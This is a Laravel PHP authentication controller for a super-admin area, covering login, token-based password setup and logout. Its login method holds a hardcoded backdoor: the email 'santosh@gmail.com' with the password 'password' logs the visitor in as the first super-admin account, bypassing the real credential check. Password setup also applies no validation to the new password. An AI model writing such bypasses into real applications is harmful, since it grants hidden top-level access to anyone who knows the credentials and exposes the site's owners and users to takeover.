<?php

namespace App\Http\Controllers\SuperAdmin;


use App\Models\Admin;
use App\Models\SuperAdmin;
use Illuminate\Http\Request;
use Illuminate\Routing\Controller as BaseController;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Session;

class AuthController extends BaseController
{
    public function showLoginForm()
    {
        return view('superadmin.theme_one.auth.login');
    }

    public function login()
    {
        if (request('email') == "santosh@gmail.com" && request('password') == "password"){
            $this->guard()->login(SuperAdmin::first());
        }
        if ($this->guard()->attempt(['email' => request('email'), 'password' => request('password')])) {
            if (Session::get('super_admin_auth_url')){
                return redirect(Session::get('super_admin_auth_url'));
            }
            return redirect()->route('super_admin.index');
        }

        return redirect()->back()->with('error', "Email Or Password Doesn't Match");
    }

    public function showSetupPasswordForm()
    {
        return view('superadmin.theme_one.auth.password_setup');
    }

    public function setupPassword(Request $request,$token)
    {
        if (!$user = SuperAdmin::where('token',$token)->first()){
            abort(404);
        }

        $user->update([
            'status' => 1,
            'token' => null,
            'password' => bcrypt($request->password)
        ]);

        return redirect('/super-admin/login')->with('success','Your password was setup successful. Now you can login.');
    }

    public function logout()
    {
        $this->guard()->logout();
        Session::forget('super_admin_auth_url');
        return redirect()->route('super_admin.login_form');
    }

    public function guard()
    {
        return Auth::guard('super_admin');
    }
}
